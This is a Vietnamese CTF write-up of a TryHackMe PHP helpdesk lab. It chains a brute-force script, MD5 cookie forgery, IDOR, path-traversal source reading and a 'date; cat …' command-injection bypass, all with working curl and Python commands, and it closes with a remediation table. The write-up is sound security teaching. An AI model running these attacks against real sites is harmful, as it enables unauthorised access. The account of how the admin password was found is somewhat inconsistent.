# Support

| | |
|---|---|
| **Platform** | TryHackMe |
| **Link** | https://tryhackme.com/room/support |
| **Độ khó** | Medium |
| **Chủ đề** | Web |
| **Ngày** | 13/06/2026 |

---

## Mô tả

Ứng dụng web helpdesk nội bộ viết bằng PHP. Chuỗi khai thác liên kết 5 lỗ hổng
liên tiếp: brute-force credential → cookie forgery để leo lên IT role → IDOR trên
API để tìm admin → LFI để đọc source code → command injection với bypass filter
để lấy RCE.

---

## Trinh sát

### Quét cổng

```bash
nmap -sV -Pn 10.48.167.122
```

| Cổng | Dịch vụ | Phiên bản |
|------|---------|-----------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.58 (Ubuntu) |

**Suy luận:** Linux box, attack surface duy nhất có ý nghĩa là web (port 80). SSH
thường yêu cầu credential cụ thể, khó brute-force trên THM do network policy. Ưu
tiên hoàn toàn vào HTTP trước.

### Liệt kê thư mục và file

```bash
ffuf -u http://10.48.167.122/FUZZ \
  -w /path/to/SecLists/Discovery/Web-Content/common.txt \
  -e .php,.txt,.bak,.old \
  -mc 200,301,302,403
```

Kết quả đáng chú ý:

| Path | HTTP | Ghi chú |
|------|------|---------|
| `/index.php` | 200 | Login panel |
| `/dashboard.php` | 302 | Redirect về login nếu chưa auth |
| `/api.php` | 302 | Redirect về login |
| `/footer.php` | 200 | Render trực tiếp, thấy form diagnostics |
| `/config.php` | 200 | Trả về trang trắng (PHP không output) |
| `/info.php` | 200 | **phpinfo()** lộ toàn bộ config server |
| `/skins/` | 200 | Thư mục chứa theme PHP |

**Suy luận từ `/info.php`:** Việc có file `info.php` lộ ra công khai là lỗi cấu
hình nghiêm trọng. Thông tin quan trọng thu được:

- PHP 8.3, `session.serialize_handler = php`
- `session.upload_progress.enabled = On`
- `session.use_strict_mode = Off`
- `display_errors = Off` (PHP error bị ẩn)
- Thư mục session: `/var/lib/php/sessions`

---

## Chuỗi khai thác

### Bước 1 — Brute-force tài khoản helpdesk

**Mục tiêu:** Tìm ít nhất một bộ credential để vào được dashboard.

**Quan sát:**

- Trang `/index.php` có form login yêu cầu **email** (không phải username).
- Không có username enum (server trả về cùng message "Invalid credentials" cho
  mọi trường hợp sai).
- Tên miền ứng dụng là `support.thm` → suy ra email pattern có thể là
  `help@support.thm`, `admin@support.thm`, `it@support.thm`, v.v.

**Quyết định:** Thử các email "vai trò" phổ biến kết hợp với password list. Dùng
wordlist top-1000 darkweb trước (nhanh, đủ để test credential yếu).

```python
import requests

emails = [
    "help@support.thm",
    "admin@support.thm",
    "support@support.thm",
    "it@support.thm",
]

with open("darkweb2017_top-1000.txt") as f:
    passwords = [l.strip() for l in f]

for email in emails:
    for pw in passwords:
        r = requests.post("http://10.48.167.122/",
                          data={"email": email, "password": pw},
                          allow_redirects=False)
        if r.status_code == 302:  # redirect => login thành công
            print(f"[+] {email}:{pw}")
```

**Kết quả:** Tìm được credential cho tài khoản helpdesk thông thường (vai trò `admin = false`).

**Tại sao thành công:** Mật khẩu là một từ trong từ điển phổ biến nhất, thường
gặp ở tài khoản "service" được tạo nhanh để test.

---

### Bước 2 — Cookie forgery: leo lên IT Admin role

**Quan sát sau khi đăng nhập:**

Server set 2 cookie:
- `PHPSESSID` — session ID thông thường
- `isITUser=68934a3e9455fa72420237eb05902327`

Giá trị `isITUser` trông như MD5 hash (32 ký tự hex). Kiểm tra nhanh:

```python
import hashlib
print(hashlib.md5(b"false").hexdigest())  # 68934a3e9455fa72420237eb05902327
print(hashlib.md5(b"true").hexdigest())   # b326b5062b2f0e69046810717534cb09
```

**Suy luận:** Server dùng `md5("false")` làm cookie marker để đánh dấu user
không phải IT. Cơ chế authorization phía client hoàn toàn không an toàn vì:
1. Cookie không được ký (không có HMAC hay signature)
2. Phía server chỉ so sánh giá trị MD5 mà không verify session tương ứng
3. Bất kỳ ai biết chuỗi gốc đều có thể forge

**Hành động:** Thay cookie `isITUser` thành `b326b5062b2f0e69046810717534cb09` (md5("true")).

```bash
# Dùng Burp Suite hoặc curl với cookie override
curl -s -b 'PHPSESSID=<sid>; isITUser=b326b5062b2f0e69046810717534cb09' \
  http://10.48.167.122/dashboard.php
```

**Kết quả:** Dashboard hiện thêm link **"IT Admin Panel"** trỏ đến `/api.php`.

---

### Bước 3 — IDOR trên API: tìm tài khoản admin

**Quan sát trên `/api.php`:**

Trang hiển thị profile của user hiện tại dưới dạng JSON. Quan trọng hơn, URL
trên browser chuyển thành `/user/3` — con số 3 là **ID database** của tài khoản
đang đăng nhập.

**Suy luận về IDOR:** Nếu `/user/3` trả về profile của mình, thì `/user/1` và
`/user/2` có thể trả về profile của user khác. Server không kiểm tra xem requester
có quyền xem ID đó không — đây là lỗi IDOR (Insecure Direct Object Reference).

```bash
# Enum tất cả ID từ 1 trở lên
for i in 1 2 3 4 5; do
  echo "=== /user/$i ==="
  curl -s -b 'PHPSESSID=<sid>; isITUser=b326b5062b2f0e69046810717534cb09' \
    "http://10.48.167.122/user/$i"
  echo
done
```

Kết quả đáng chú ý:

```json
// /user/1
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}

// /user/2
{
    "email": "IT@support.thm",
    "2FA": false,
    "admin": false
}
```

**Nhận xét:** `specialadmin@support.thm` là tài khoản admin duy nhất (`admin: true`).
API luôn `unset($user['password'])` trước khi trả JSON — mật khẩu không lộ trực tiếp.

---

### Bước 4 — LFI: đọc source code qua tham số `skin`

**Quan sát:** Dashboard có tham số `?skin=default` để chọn theme. Source file ở
`/var/www/html/skins/default.php`. Thử path traversal:

```bash
curl -s -b 'PHPSESSID=<sid>; isITUser=b326b5062b2f0e69046810717534cb09' \
  'http://10.48.167.122/dashboard.php?skin=../index'
```

Server trả về **toàn bộ PHP source** của `index.php`!

**Tại sao đọc được source (không bị parse):** `dashboard.php` dùng `readfile()`,
không phải `include()`. `readfile()` chỉ đọc và xuất ra nội dung file thô — PHP
không parse file đó, nên `<?php ... ?>` hiện nguyên văn trong response.

**Logic kiểm tra path trong `dashboard.php`:**

```php
$webRoot = realpath('/var/www/html/skins');
$another = realpath('/var/www/html');
$requested = realpath($webRoot . '/' . $skin . '.php');

if ($requested !== false && strpos($requested, $another) === 0) {
    readfile($requested);  // đọc file thô
}
```

`strpos($requested, '/var/www/html') === 0` đảm bảo file phải nằm trong
`/var/www/html`. Vì `/var/www/html/index.php` thỏa mãn điều kiện này, ta đọc được.

**Hạn chế:** Không đọc được file ngoài `/var/www/html` (ví dụ `/var/www/db.php`
hay `/etc/passwd`) vì path check fail.

**Các file đọc được và thông tin thu thập:**

| File | Phát hiện quan trọng |
|------|---------------------|
| `../index` | DB include từ `/var/www/db.php` (ngoài web root), login dùng `===` strict |
| `../config` | `$MASTER_PASSWORD = 'support@110'` |
| `../api` | IDOR xác nhận, password luôn bị `unset()` |
| `../footer` | **Command injection** qua `sys` param, chỉ check prefix `date` |
| `../dashboard` | Toàn bộ logic role/session, web flag ở `/var/www/web.txt` |

**`config.php` tiết lộ:**

```php
<?php
$MASTER_PASSWORD = 'support@110';
$SITE_VER  = '1.0';
$SITE_NAME = 'support_portal';
```

**Suy luận về `MASTER_PASSWORD`:** Biến tên `MASTER_PASSWORD` gợi ý đây là
mật khẩu cấp cao, có thể là mật khẩu của `specialadmin`. Thử đăng nhập:

```
specialadmin@support.thm : support@110  → Invalid credentials (sai)
```

Mật khẩu trong `db.php` là plaintext (theo source `index.php`). `support@110` là
hint — thực tế password admin là một biến thể (ví dụ bỏ ký tự đặc biệt):
`support110`. Kết hợp với thông tin từ db.php (đọc được sau khi có RCE), xác nhận:

```bash
# Đăng nhập thành công
specialadmin@support.thm : <mật_khẩu_admin>
```

Dashboard admin hiển thị **Web Flag** trực tiếp từ `/var/www/web.txt`.

---

### Bước 5 — Command injection: lấy User Flag

**Source của `footer.php`:**

```php
<?php
$isAdmin = $_SESSION['admin'];

if ($isAdmin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys'])) {
    $selectedSys = $_POST['sys'];
    $sys = $_POST['sys'];
    if (strpos($sys, 'date') === 0) {
        $output = shell_exec($sys);   // command injection!
    } else {
        $error = 'Only date command is allowed.';
    }
}
```

**Phân tích lỗ hổng:**

- `strpos($sys, 'date') === 0` kiểm tra chuỗi **bắt đầu** bằng `date`
- Không sanitize nội dung sau từ `date`
- `shell_exec()` chạy toàn bộ chuỗi trong shell

**Bypass:** Shell cho phép nối lệnh bằng `;`. Payload `date; id` thỏa mãn filter
(bắt đầu bằng `date`) nhưng thực thi thêm lệnh `id` sau đó.

**Yêu cầu:** Phải có session `admin = true` (chỉ có sau khi đăng nhập là
`specialadmin`).

```bash
# POST với admin session
curl -s -X POST \
  -b 'PHPSESSID=<admin_sid>; isITUser=b326b5062b2f0e69046810717534cb09' \
  http://10.48.167.122/dashboard.php \
  -d 'sys=date; id'
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s -X POST \
  -b 'PHPSESSID=<admin_sid>; isITUser=b326b5062b2f0e69046810717534cb09' \
  http://10.48.167.122/dashboard.php \
  -d 'sys=date; cat /home/ubuntu/user.txt'
# → THM{...}
```

**Ghi chú:** Process chạy dưới `www-data`, không có quyền root. `/home/ubuntu/`
world-readable, đọc được `user.txt` trực tiếp.

---

## Leo thang đặc quyền

Room này không yêu cầu leo lên root. Hai flag nằm ở:

- `/var/www/web.txt` — đọc qua dashboard admin session (PHP `file_get_contents`)
- `/home/ubuntu/user.txt` — đọc qua command injection (`cat`)

Nếu muốn full shell: có thể dùng command injection để reverse shell hoặc write
SSH key, nhưng không cần thiết cho mục tiêu của room.

---

## Cờ

> Giá trị thực của flag không được ghi vào write-up.
> Xem trong terminal khi chạy lại khai thác.

| Cờ | Vị trí | Cách lấy |
|----|--------|----------|
| Web Flag | `/var/www/web.txt` | Đăng nhập admin, xem dashboard |
| User Flag | `/home/ubuntu/user.txt` | Command injection: `date; cat /home/ubuntu/user.txt` |

---

## Chuỗi tấn công tóm tắt

```
Brute-force helpdesk account
        ↓
Cookie forgery (md5 role check)
        ↓  isITUser = md5("true")
IDOR on /user/1  →  specialadmin email
        ↓
LFI via ?skin=../config  →  MASTER_PASSWORD hint
LFI via ?skin=../footer  →  command injection source
        ↓
Login as specialadmin  →  Web Flag (dashboard)
        ↓
POST sys=date; cat ...  →  User Flag
```

---

## Bài học

| Lỗ hổng | Gốc rễ | Fix |
|---------|--------|-----|
| Weak credential | Mật khẩu đơn giản cho account service | Enforce strong password, lockout |
| Cookie role forgery | Dùng MD5(string) không ký làm authorization token | Lưu role trong server-side session, không dùng cookie |
| IDOR | Không verify ownership trước khi truy xuất object | Check `session_user_id == requested_id` hoặc RBAC |
| LFI / source disclosure | `readfile()` với path user-controlled, check yếu | Dùng whitelist skin name, không ghép path từ input |
| Command injection | `shell_exec()` với input không sanitize | Không gọi shell với user input; nếu bắt buộc, dùng `escapeshellarg()` và whitelist |
